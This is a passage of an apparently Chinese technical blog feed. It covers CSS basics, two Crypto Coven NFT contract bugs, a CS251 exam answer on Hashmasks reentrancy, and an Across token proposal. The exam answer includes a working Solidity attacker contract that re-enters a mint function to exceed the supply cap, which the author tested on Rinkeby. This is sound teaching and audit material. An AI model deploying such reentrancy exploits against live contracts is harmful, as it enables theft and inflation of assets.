class="line">    <span class="number">50%</span> &#123;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">100px</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">100px</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="number">75%</span> &#123;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">100px</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="number">100%</span> &#123;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>transition</li></ol><ul><li>过渡动画，修改某些属性的时候不会立刻生效，它会以动画的形式逐渐过渡到要设置的值</li><li>transition-property: 指需要使用过渡动画的属性，这里设置了背景色，高度和宽度。也可以通过关键字 all 设置所有的属性；</li><li>transition-duration: 动画持续的时间，可以单独控制某个属性的时间， transition-duration：1.8s, 1.0s, 1.0s 表示修改 background-color 需要 1.8s, 修改 height 需要 1.0s,  修改 width 需要 1.0s;</li><li>transition-delay：动画开始时需要延迟多长时间才开始执行；</li><li>transition-timing-function：表示动画执行时的时间函数，不同函数走过的曲线不一样；</li></ul><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.move-transition</span> &#123;</span><br><span class="line">    <span class="comment">/* transition-property: all; */</span></span><br><span class="line">    <span class="attribute">transition-property</span>: background-color, height, width;</span><br><span class="line">    <span class="attribute">transition-duration</span>: <span class="number">1.8s</span>, <span class="number">1.0s</span>, <span class="number">1.0s</span>;</span><br><span class="line">    <span class="attribute">transition-delay</span>: <span class="number">0.1s</span>;</span><br><span class="line">    <span class="attribute">transition-timing-function</span>: linear;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="chang-du-dan-wei">长度单位</span></h3><ol><li>相对单位：相对单位指它的尺寸是相对于另外一个元素的尺寸。常用的是 em、rem、vh、vw、vmin、vmax。<ul><li>em: 它是相对于「自身或父元素」的 font-size 来计算自身的尺寸</li><li>rem（font size of root element）: 这个单位是依据「根元素 html 标签」的 font-size 来计算最终的值，这个单位对移动端web开发十分实用，通过设置 html 的 font-size 来等比缩放元素的大小。</li><li><strong>vw（viewport width）</strong>，可视区域宽度，比如设置 50vw，相当于可视区域宽度的一半；</li><li><strong>vh（viewport height）</strong>，可视区域高度，比如设置 50vh，相当于可视区域高度的一半；</li><li><strong>vmax</strong>: vw 和 vh 中最大的；</li><li><strong>vmin</strong>: vw 和 vh 中最小的；</li></ul></li><li>绝对单位<ul><li>像素 px， cm等</li></ul></li><li>时间单位<ul><li>s</li><li>ms</li></ul></li></ol><h3><span id="yi-fu-yong-yi-wei-hu-jie-gou-qing-xi-de-css">易复用、易维护、结构清晰的 CSS</span></h3><p>less，sass</p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      CSS 基础──样式篇
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="读书笔记" scheme="https://qiwihui.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>解释 Crypto Coven 合约的两个 bug</title>
    <link href="https://qiwihui.com/qiwihui-blog-154/"/>
    <id>https://qiwihui.com/qiwihui-blog-154/</id>
    <published>2024-05-15T02:25:31.383Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>Crypto Coven 合约作者在他的文章 <a href="https://cryptocoven.mirror.xyz/0eZ0tjudMU0ByeXLlRtPzDqxGzMMZw6ldzf-HfYETW0">Crypto Coven Contract Bugs: An Arcanist’s Addendum</a> 中描述了合约中的两个 bug，这篇文章我们来看看这两个bug。这两个 bug 并不会影响女巫 NFT 的所有权。</p><span id="more"></span><h2><span id="bug-1-zong-gong-ke-zhu-zao-nu-wu-de-shu-liang">Bug 1：总共可铸造女巫的数量</span></h2><p>在合约中有一个修改器 <code>canMintWitches()</code> 用来检查地址是否能够在公开发售阶段铸造更多的 NFT：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 public maxWitches; // 初始化为 9,999</span><br><span class="line">uint256 public maxGiftedWitches; // 初始化为 250</span><br><span class="line"></span><br><span class="line">modifier canMintWitches(uint256 numberOfTokens) &#123;</span><br><span class="line">    require(</span><br><span class="line">        tokenCounter.current() + numberOfTokens &lt;=</span><br><span class="line">            maxWitches - maxGiftedWitches,</span><br><span class="line">        &quot;Not enough witches remaining to mint&quot;</span><br><span class="line">    );</span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面的 bug 只会在特定的条件下触发。问题在于应该有 9749 个女巫在公开函数中铸造，250个在 owner-only 函数中铸造，共计9999个。这个逻辑在公开发售阶段如果没有女巫被赠送，则完全正常。然而，项目方在这期间铸造并赠送了女巫，这意味着在上面的条件检查中，右边的总数应该也要变化才正确。铸造赠送越多，相应能允许的 <code>tokenId</code> 越高。</p><p>在公开发售结束的时候，有93个女巫被赠送，这意味着 <code>tokenCounter.current()</code> 到达 9749 使得公开发售结束时，总共只有 9656 个女巫被铸造。</p><p><code>canGiftWitches()</code> 函数的作用是为了限制可以赠送的女巫数量最大为 250，所以我们不能通过以下的方式规避：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 public maxWitches; // 初始化为 9,999</span><br><span class="line">uint256 public maxGiftedWitches; // 初始化为 250</span><br><span class="line">uint256 private numGiftedWitches;</span><br><span class="line"></span><br><span class="line">modifier canGiftWitches(uint256 num) &#123;</span><br><span class="line">    require(</span><br><span class="line">        numGiftedWitches + num &lt;= maxGiftedWitches,</span><br><span class="line">        &quot;Not enough witches remaining to gift&quot;</span><br><span class="line">    );</span><br><span class="line">    require(</span><br><span class="line">        tokenCounter.current() + num &lt;= maxWitches,</span><br><span class="line">        &quot;Not enough witches remaining to mint&quot;</span><br><span class="line">    );</span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果是，有93个女巫永久消失，合约总共铸造了9906个女巫。</p><h3><span id="xiu-fu-fang-fa">修复方法</span></h3><p>我们可以通过 <code>numGiftedWitches</code> 记录已经赠送的女巫数量来修正。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 public maxWitches; // 初始化为 9,999</span><br><span class="line">uint256 public maxGiftedWitches; // 初始化为 250</span><br><span class="line">uint256 private numGiftedWitches;</span><br><span class="line"></span><br><span class="line">modifier canMintWitches(uint256 numberOfTokens) &#123;</span><br><span class="line">    require(</span><br><span class="line">        tokenCounter.current() + numberOfTokens &lt;=</span><br><span class="line">            maxWitches - maxGiftedWitches + numGiftedWitches,</span><br><span class="line">        &quot;Not enough witches remaining to mint&quot;</span><br><span class="line">    );</span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="bug-2-ban-shui">Bug 2：版税</span></h2><p>Crypto Coven 认为拥有链上版税很重要，而不仅仅是使用特定于平台的链下实现，这就使得他们使用了 <a href="https://eips.ethereum.org/EIPS/eip-2981">EIP-2981</a>。 支持该标准的代码很简单：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function royaltyInfo(uint256 tokenId, uint256 salePrice)</span><br><span class="line">    external</span><br><span class="line">    view</span><br><span class="line">    override</span><br><span class="line">    returns (address receiver, uint256 royaltyAmount)</span><br><span class="line">&#123;</span><br><span class="line">    require(_exists(tokenId), &quot;Nonexistent token&quot;);</span><br><span class="line"></span><br><span class="line">    return (address(this), SafeMath.div(SafeMath.mul(salePrice, 5), 100));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它是如何工作的呢？ 市场调用该函数来读取接收方地址和版税金额的数据，然后相应地发送版税。 在上述例子中，接收方是合约地址，版税金额是 5%。然而，从 Solifidy 0.6.x 开始，合约必需要实现 <code>receive()</code> 方法才能接收以太，而女巫合约没有实现。并且，合约的测试在检查 <code>royaltyInfo()</code> 函数时，检查了是否返回正确的值，但是没有测试接收版税，所以如果市场尝试发送版税给合约会引起 <code>revert</code> 。</p><p>幸运的是，在这种情况下，补救措施非常简单，这要归功于 <a href="https://royaltyregistry.xyz/">Royalty Registry</a>。 项目方配置了一个覆盖指向不同的接收者 <code>receiver</code> 地址（在本例中，是他们的多重签名钱包），所以现在从 Royalty Registry 读取的市场将使用覆盖后的值。</p><h3><span id="xiu-fu-fang-fa">修复方法</span></h3><p>修复此错误以支持 EIP-2981 的最简单方法是简单地返回接收提款的所有者地址，而不是合约地址。 另一种选择是添加一个 <code>royalReceiverAddress</code> 变量和一个 <code>setter</code> 函数来配置这个值。</p><p>如果确实想将以太接收到合约地址，你需要做的就是在合约中添加一个 <code>receive()</code> 函数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">receive() external payable &#123;&#125;</span><br></pre></td></tr></table></figure><h2><span id="zong-jie">总结</span></h2><p>学习在 Solidity 中进行开发可能是一场考验——无论是小错误还是大错误，都会永远存在于区块链上，而且通常要付出巨大的代价。 但是，这僵化、无情的空间却有它自己的魅力，在约束中诞生的创造力，通过共同的不眠之夜形成的团结。 对于任何在荒野中闯出自己道路的初出茅庐的奥术师：我希望这里所提供的知识能够进一步照亮这条道路。</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      解释 Crypto Coven 合约的两个 bug
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="区块链" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>CS251 - final 2021 - 问题 4</title>
    <link href="https://qiwihui.com/qiwihui-blog-157/"/>
    <id>https://qiwihui.com/qiwihui-blog-157/</id>
    <published>2024-05-15T02:25:31.381Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p><strong>问题4. [16 分]: Hashmasks 重入缺陷</strong></p><p>在第8课和第3节中，我们讨论了 solidity 重入缺陷。在这个问题中，我们将看一个有趣的现实世界的例子。考虑下面16384个NFT中使用的 solidity 代码片段。通过调用此NFT合约上的 <code>mintNFT()</code> 函数，用户一次最多可以铸造20个NFT。您可以假设所有内部变量都由构造函数正确初始化（未显示）。</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function mintNFT(uint256 numberOfNfts) public payable &#123;</span><br><span class="line">  require(totalSupply() &lt; 16384, &#x27;Sale has already ended&#x27;);</span><br><span class="line">  require(numberOfNfts &gt; 0, &#x27;numberOfNfts cannot be 0&#x27;);</span><br><span class="line">  require(numberOfNfts &lt;= 20, &#x27;You may not buy more than 20 NFTs at once&#x27;);</span><br><span class="line">  require(totalSupply().add(numberOfNfts) &lt;= 16384, &#x27;Exceeds NFT supply&#x27;);</span><br><span class="line">  require(getNFTPrice().mul(numberOfNfts) == msg.value, &#x27;Value sent is not correct&#x27;);</span><br><span class="line">  for (uint256 i = 0; i &lt; numberOfNfts; i++) &#123;</span><br><span class="line">    uint256 mintIndex = totalSupply(); // get number of NFTs issued so far</span><br><span class="line">    _safeMint(msg.sender, mintIndex); // mint the next one</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _safeMint(address to, uint256 tokenId) internal virtual override &#123;</span><br><span class="line">  // Mint one NFT and assign it to address(to).</span><br><span class="line">  require(!_exists(tokenId), &#x27;ERC721: token already minted&#x27;);</span><br><span class="line">  _data = _mint(to, tokenId); // mint NFT and assign it to address to</span><br><span class="line">  _totalSupply++; // increment totalSupply() by one</span><br><span class="line">  if (to.isContract()) &#123;</span><br><span class="line">    // Confirm that NFT was recorded properly by calling</span><br><span class="line">    // the function onERC721Received() at address(to).</span><br><span class="line">    // The arguments to the function are not important here.</span><br><span class="line">    // If onERC721Received is implemented correctly at address(to) then</span><br><span class="line">    // the function returns _ERC721_RECEIVED if all is well.</span><br><span class="line">    bytes4 memory retval = IERC721Receiver(to).onERC721Received(to, address(0), tokenId, _data);</span><br><span class="line">    require(retval == _ERC721_RECEIVED, &#x27;NFT Rejected by receiver&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>让我们证明 <code>_safeMint</code> 根本不安全（尽管它的名字是安全）。</p><p><strong>A)</strong>    假设已经铸造了16370个NFT，那么 totalSupply()=16370。请解释恶意合约如何导致超过16384个NFT被伪造。攻击者最多可以造出多少个NFT？</p><p>提示：如果在调用地址 <code>onERC721Received</code> 是恶意的，结果会怎样？请仔细检查铸币回路，并考虑重入缺陷。</p><p><strong>答：</strong> 在已经 mint 16370 个NFT基础上，调用 mingNFT 可传入的最大 numberOfNfts 为 14 可以通过 mintNFT 开始五行的限制，当上述合约在调用地址 <code>to</code> 上的 <code>onERC721Received</code> 函数时，这个函数可以再次调用上述 mingNFT 函数，此时，在原来已经 mint 一个的基础上，传入的 numberOfNfts 为 13 个可以通过 mintNFT 的限制，然后重复同样的过程，依次可以 mint 12， 11 直到 1，最后在函数内部，已经没有其他限制，故这些数量的 NFT 均可以被 mint，所以理论上总共可以 mint 的数量为 $14+13+\dots+2+1=105$。</p><p><strong>B)</strong>    假设现在总供给的价值是16370，请写出实施对（a）部分进行攻击的恶意Solidity合约代码。</p><p><strong>答：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attacker is IERC721Receiver &#123;</span><br><span class="line">  Hashmasks hashmasks;</span><br><span class="line"></span><br><span class="line">  constructor(address _hashmasksAddress) &#123;</span><br><span class="line">    hashmasks = Hashmasks(_hashmasksAddress);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function attack() public payable&#123;</span><br><span class="line">    &#123;</span><br><span class="line">      uint256 num = hashmasks.balanceOf(address(this));</span><br><span class="line">      // console.log(&quot;num: &quot;, num);</span><br><span class="line">      if (num &lt; 14) &#123;</span><br><span class="line">        // 16384 - 16370 = 14</span><br><span class="line">        hashmasks.mintNFT&#123;value: 14-num&#125;(14 - num);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function onERC721Received(</span><br><span class="line">    address _from,</span><br><span class="line">    address _to,</span><br><span class="line">    uint256 _tokenId,</span><br><span class="line">    bytes memory _data</span><br><span class="line">  ) external returns (bytes4) &#123;</span><br><span class="line">    attack();</span><br><span class="line">    return msg.sig;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>attack</code> 设置为 <em><code>payable</code> 是因为需要通过攻击合约调用 mintNFT 函数，需要发送一定数量的以太，可以选择在部署后先发送一定数量的以太到攻击者合约中，也可以将 <code>attack</code> 设置成 <code>payable</code>，在攻击的交易中发送以太到</em></p><p>实验：在 Rinkeby 上部署，攻击者合约地址为 0xf1eb80Bb66A70E44d42B3ceC0bC18Ec28B5F2Ea8，实际攻击的交易：<a href="https://rinkeby.etherscan.io/tx/0xb90496fd8789c3d1800df1bd3a571d019fb6158cbd521a9d05e57ad62460d15f">https://rinkeby.etherscan.io/tx/0xb90496fd8789c3d1800df1bd3a571d019fb6158cbd521a9d05e57ad62460d15f</a>，这个部署的合约中，NFT的价格设置为 1 wei，所以理论上只要发送 105 wei 到攻击这合约中，但是保险起见，发送了150wei，最后也可以看到攻击这合约中还剩下 45 wei。</p><p><strong>C)</strong>    你会在前一页的代码中添加或更改哪一行Solidity来防止你的攻击?请注意，单个交易不应该铸造超过20个NFT。</p><p><strong>答：</strong> 可以将 <code>_safeMint</code> 方法中， <code>_totalSupply++;</code> 这一行放到验证 NFT 的调用之后：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> function _safeMint(address to, uint256 tokenId) internal virtual override &#123;</span><br><span class="line">   // Mint one NFT and assign it to address(to).</span><br><span class="line">   require(!_exists(tokenId), &#x27;ERC721: token already minted&#x27;);</span><br><span class="line">   _data = _mint(to, tokenId); // mint NFT and assign it to address to</span><br><span class="line">   </span><br><span class="line">   if (to.isContract()) &#123;</span><br><span class="line">     // Confirm that NFT was recorded properly by calling</span><br><span class="line">     // the function onERC721Received() at address(to).</span><br><span class="line">     // The arguments to the function are not important here.</span><br><span class="line">     // If onERC721Received is implemented correctly at address(to) then</span><br><span class="line">     // the function returns _ERC721_RECEIVED if all is well.</span><br><span class="line">     bytes4 memory retval = IERC721Receiver(to).onERC721Received(to, address(0), tokenId, _data);</span><br><span class="line">     require(retval == _ERC721_RECEIVED, &#x27;NFT Rejected by receiver&#x27;);</span><br><span class="line">   &#125;</span><br><span class="line">_totalSupply++; // increment totalSupply() by one</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这样，当合约被重入攻击时，由于 <code>_totalSupply</code> 还没有增加，因此在第二次进入 <code>mintNFT</code> 函数时 <code>mintIndex</code> 的值是第一次 mint 的值，会导致触发 <code>'ERC721: token already minted'</code> 这个错误，有效保证合约安全。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (uint256 i = 0; i &lt; numberOfNfts; i++) &#123;</span><br><span class="line">  uint256 mintIndex = totalSupply(); // get number of NFTs issued so far</span><br><span class="line">  _safeMint(msg.sender, mintIndex); // mint the next one</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>验证交易： <a href="https://rinkeby.etherscan.io/tx/0xa5f70a226c5fd64132eee800f8902ddb9b4ff562ff7f37820d11746fbde52acb">https://rinkeby.etherscan.io/tx/0xa5f70a226c5fd64132eee800f8902ddb9b4ff562ff7f37820d11746fbde52acb</a></p><p>感谢 discord <strong>yyczz#5837</strong> 对于这个问题的指导。</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      CS251 - final 2021 - 问题 4
    
    </summary>
    
    
      <category term="区块链" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Across 代币发布提案 v2</title>
    <link href="https://qiwihui.com/qiwihui-blog-160/"/>
    <id>https://qiwihui.com/qiwihui-blog-160/</id>
    <published>2024-05-15T02:25:31.378Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="across-dai-bi-fa-bu-ti-an-v2">Across 代币发布提案 v2</span></h1><p>这是一个修订后的提案，它建立在<a href="https://forum.across.to/t/across-token-launch-proposal/195">最初的 Across 代币发布提案</a>的基础上，增加了社区反馈和实施细节。</p><p>Across 代币的推出将发展和团结 Across 社区，激励流动性提供者，提高 Across 的知名度，并进一步实现成为最快和最便宜的 L2 桥的使命。 该提案概述了代币发布计划，大致可分为两部分：</p><ol><li>初始分配（Initial Distribution）── 多样化的空投和国库代币交换</li><li>奖励锁定激励计划（Reward Locking Incentive Program） ── 一种新颖的奖励计划，用于激励支持 Across 协议的行为</li></ol><h2><span id="di-yi-bu-fen-chu-shi-fen-pei">第一部分、初始分配</span></h2><p>将铸造 <strong>1,000,000,000 ($ACX)</strong> Across 代币 。 700,000,000 $ACX 将保留在 Across DAO 国库中，一部分将保留用于激励奖励。 300,000,000 $ACX 将作为初始供应，并按以下方式分配：</p><p><strong>$ACX 空投</strong> ── 总共 <strong>100,000,000 $ACX</strong> 将奖励给以下团体：</p><ol><li>10%：拥有“联合创始人（Co-founder）”或“早期招募（Early Recruit）”的社区 Discord 成员</li><li>10%：拥有“DAO 贡献者（DAO Contributor）”或“高级 DAO 贡献者（Senior DAO Contributor）”的社区 Discord 成员</li><li>20%：代币将作为额外奖励保留给 Across 社区的重要早期贡献者，其中可能包括 DAO 贡献者、高级 DAO 贡献者和开发者支持团队。代币发布后，社区将有机会提交关于如何分配的提案，$ACX 持有者将通过快照进行投票。</li><li>10%：在 2022 年 3 月 11 日之前桥接资产的早期 Across 协议用户。这些代币将根据完成的转账量按比例分配给钱包。将调整这些数字以过滤掉可能来自空投农民的小额转账。</li><li>50%：在代币发布之前将 ETH、USDC、WBTC 和 DAI 汇集到 Across 协议中的流动性提供者。对 LP 的奖励数量按规模按比例分配，并且自协议开始以来，每个区块都会发出固定数量的代币。</li></ol><ul><li>*权重和确切细节都可能发生变化，并取决于代币发布前收集的数据。*</li></ul><p><strong>$UMA 的代币交换 ── 100,000,000 $ACX</strong> 将与 Risk Labs Treasury 交换价值 5,000,000 美元的 $UMA。 这实现了两个目标 ── 它赋予 UMA 中的 Across 社区所有权和治理权，这对桥的安全性至关重要，并且它还提供投票奖励作为 Across DAO 国库的收入来源。 Risk Labs 推出了 Across，并将在可预见的未来继续支持协议和社区。 向 Risk Labs 提供 $ACX 将进一步激励 Risk Labs 团队。 Risk Labs 可能会考虑使用这些代币来建立和扩展一个专门的开发团队，以帮助提供 $ACX 的流动性，并参与治理。 无论用途如何，这些代币只会用于协议的利益。</p><p><strong>战略合作伙伴和中继者资本 ── 100,000,000 $ACX</strong> 将转移到 Risk Labs Treasury，以筹集资金并从 DeFi 行业的主要参与者那里获得贷款。 跨链桥领域的竞争对手正在与大型机构合作，并获得大量资源来推动其发展。 Risk Labs 可以使用这些代币来帮助 Across 协议做同样的事情。 一个关键的资源限制是中继者网络，其中大量资金由 Risk Labs 的国库提供。 与资本充足的大型加密货币玩家合作有助于缓解这一瓶颈并加速增长。 为实现这一目标，Risk Labs 可能会使用这些 $ACX 代币来筹集成功代币（<a href="https://umaproject.org/products/success-tokens">success token</a>）资金，在通过区间代币（<a href="https://umaproject.org/products/range-tokens">range tokens</a>）借款时用作抵押，以及用于奖励以促进中继者网络的去中心化。</p><h2><span id="di-er-bu-fen-across-jiang-li-suo-ding-ji-li-ji-hua">第二部分、Across 奖励锁定激励计划</span></h2><p>700,000,000 $ACX 储备的很大一部分将通过此激励计划发放，社区成员可以通过执行以下任何操作来赚取 $ACX：</p><ol><li>质押来自桥接池的 Across LP 份额 ── WETH 和 USDC 池将是第一个受到激励的 Across 池</li><li>从指定的 $ACX/ETH 池中质押 $ACX LP 份额</li><li>通过 Across 推荐计划（Across Referral Program）推荐用户</li></ol><p><strong>流动性提供者（LP）</strong> ── 奖励锁定是传统流动性挖矿的增强版本，它阻止耕种（farm）和抛售活动，同时奖励协议的忠实贡献者。流动性提供者 (LP) 有一个他们获得奖励的个性化利率。 LP 保持未提取（和未售出）累积奖励的时间越长，LP 获得额外奖励的速度就越快。</p><p>每个受激励的流动性池将有一个基本的发放率，每个 LP 将有一个针对每个池的独特收益增值率（multiplier）。 LP 将按比例获得基准发放量乘以 LP 的独特收益增值率的份额。 LP 的收益增值率从第 0 天的 1 开始，当奖励未提取 100 天时可以线性增长到最大值 3。下表说明了这个简单的过程。例如，持有 60 天未领取的奖励的 LP 的收益增值率为 2.2。一旦 LP 领取任何奖励，收益增值率立即重置为 1，LP 将需要重赚取该乘数。</p><table><thead><tr><th>持有天数</th><th>收益增值率</th></tr></thead><tbody><tr><td>0</td><td>1.0</td></tr><tr><td>25</td><td>1.5</td></tr><tr><td>50</td><td>2.0</td></tr><tr><td>75</td><td>2.5</td></tr><tr><td>100</td><td>3.0</td></tr></tbody></table><p>最初的奖励锁定计划预计将运行 6 个月，届时将及时审查是否有任何更改。 该计划将从以下基本发放率开始：</p><ul><li>Across ETH LP 份额每天约 100,000 $ACX</li><li>Across USDC LP 份额每天约 100,000 $ACX</li><li>指定 $ACX/$ETH LP 份额每天约 20,000 $ACX</li></ul><p>这相当于大约 4MM 到 10MM $ACX，具体取决于 LP 的行为。 $ACX 持有者可以随时提议并投票添加新资产或更改这些参数。</p><p><strong>Across 推荐计划</strong> ── 推荐计划将 Across 社区转变为销售队伍。要参与推荐计划，Across 支持者可以输入他们的钱包地址以生成唯一的推荐链接。单击该链接并在 Across 上完成桥接转移的用户会将 $ACX 奖励分配给推荐人。鼓励支持者与朋友分享他们的链接，并在 Twitter 等社交媒体上宣传 Across。这也可以用于与其他项目的集成。跨链聚合器或 DEX 可以创建推荐链接以将 Across 连接到他们的 dApp。单击该链接并完跨链转移后，奖励将分配给该项目。该钱包所有的未来转账将继续向推荐人发放奖励，除非钱包用户点击不同的推荐链接或推荐人领取了他们的奖励。</p><p>与 LP 的奖励锁定类似，推荐人可以通过保持奖励未认领并达到特定数量的推荐或确保一定数量的数量来提高他们赚取推荐费的比率。推荐费是在 $ACX 中授予推荐人的跨链 LP 费用的百分比。如果没有领取奖励并且完成了一定数量的推荐或交易量，那么推荐费就会上涨。推荐人分为五层：</p><ul><li>铜（Copper）：40% 的推荐费。</li><li>青铜（Bronze）：50% 推荐费。铜推荐人在 3 次推荐或跨链交易量超过 5 万美元后晋升为青铜</li><li>白银（Silver）：60% 的推荐费。青铜推荐人在 5 次推荐或跨链交易量超过 10 万美元后晋升为白银</li><li>黄金（Gold）：70% 的推荐费。白银推荐人在 10 次推荐或超过 25 万美元的跨链交易量后升级为黄金。</li><li>白金（Platinum）：80% 的推荐费。黄金推荐人在 20 次推荐或超过 50 万美元的跨链交易量后升级为白金。</li></ul><p>推荐奖励每周分配一次，推荐人每周只能增加一个等级。一旦推荐人领取奖励，推荐人的等级立即重置回铜，并且所有推荐链接都失效。这意味着推荐人需要让用户再次点击他们的推荐链接才能继续赚取推荐费，并且推荐人需要重新获得他们的等级，这需要至少 5 周的时间才能达到白金级别。</p><p><strong>奖励锁定 = DeFi 的游戏化</strong></p><p>奖励锁定的好处是显而易见的。保持奖励锁定不鼓励耕种和抛售活动，但更重要的是，它使 LP 和推荐人与协议更加紧密。如果您被鼓励参与该协议，您自然会想了解更多有关它的信息，并且您会被激励加入社区并进一步履行其使命。</p><p>鉴于您可以为每个流动性池赚取的各种独特收益增值率，以及您作为推荐人可以获得的不同层级，为协议做出贡献的每个钱包都将发展出一个个性化的身份。类似于角色扮演游戏中的角色，各种统计数据可以转化为经验值，使钱包可以升级并获得协议中的状态。</p><p>奖励锁定可以通过精心涉及的用户界面和用户体验进一步游戏化，使其看起来像一个真正的游戏。它可以像 RPG 一样构建，用户可以在达到某些里程碑时获得特殊的 NFT 或物品。社区成员可以构建这个和/或使用这些统计数据的实际游戏并相互进行战斗。同样，排行榜可以识别所有忠诚的 Across 用户的成就。这一切都会使用户非常不愿意领取他们的奖励并降低身份。</p><p><strong>质押 $ACX</strong> ── 随着协议的成熟，社区可以考虑为 $ACX 设置质押机制，该机制可以授予进一步的治理权，并分享整个协议的收入。治理可以决定激励奖励的方向，以确定哪些代币和哪些 L2 应该获得更多流动性。这种类似投票锁定的机制可以为 $ACX 和 Across 协议增加更多价值。</p><h2><span id="jie-lun">结论</span></h2><p>除了建立社区和激励项目目标外，Across 代币的发布旨在为拥有 $ACX 创造价值和意义。 目标是让 $ACX 代币持有者在启动后立即通过他们的代币与协议进行交互。 事实上，通过概述在空投之前将获得奖励的行为，这个协议现在正在鼓励整个 LP 活动。 Across 奖励锁定激励计划将吸引社区成员并使用 $ACX 作为货币来游戏化和激励对协议的贡献。 $ACX 代币将代表 Across 协议在经济和治理方面的真正所有权。</p><p>非常欢迎对此提案提出反馈意见。 可以而且应该讨论机制和数字，以便社区在此代币发布之前感到舒适。</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Across 代币发布提案 v2
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="区块链" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Crypto Coven 加密女巫 NFT 合约解读</title>
    <link href="https://qiwihui.com/qiwihui-blog-152/"/>
    <id>https://qiwihui.com/qiwihui-blog-152/</id>
    <published>2024-05-15T02:25:31.374Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要是对 <a href="https://twitter.com/mannynotfound">@mannynotfound</a> 的推文 <a href="https://twitter.com/mannynotfound/status/1470535464922845187">https://twitter.com/mannynotfound/status/1470535464922845187</a> 的整理和补充。</p><p>加密女巫的合约代码堪称艺术品。代码出自工程师 Matthew Di Ferrante(<a href="https://twitter.com/matthewdif">@matthewdif</a>)，涉及 gas 优化，修改器以及 Opensea 预授权等诸多优化措施，对于学习 NFT 合约是个很好的参考材料。</p><h3><span id="ji-ben-qing-kuang">基本情况</span></h3><p>名称；Crypto Coven</p><p>符号： WITCH</p><p>合约地址：0x5180db8f5c931aae63c74266b211f580155ecac8</p><p>合约代码地址：<a href="https://etherscan.io/address/0x5180db8f5c931aae63c74266b211f580155ecac8#code">https://etherscan.io/address/0x5180db8f5c931aae63c74266b211f580155ecac8#code</a></p><p>Solidity版本： <code>^0.8.0</code></p><span id="more"></span><h3><span id="banner">Banner</span></h3><p>这个 banner 可以体会到项目方想要做的不是像 Crypto Punks 或者其他像素风格 NFT 一样的作品。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">.・。.・゜✭・.・✫・゜・。..・。.・゜✭・.・✫・゜・。.✭・.・✫・゜・。..・✫・゜・。.・。.・゜✭・.・✫・゜・。..・。.・゜✭・.・✫・゜・。.✭・.・✫・゜・。..・✫・゜・。</span><br><span class="line"></span><br><span class="line">                                                       s                                            _                                 </span><br><span class="line">                         ..                           :8                                           u                                  </span><br><span class="line">             .u    .    @L           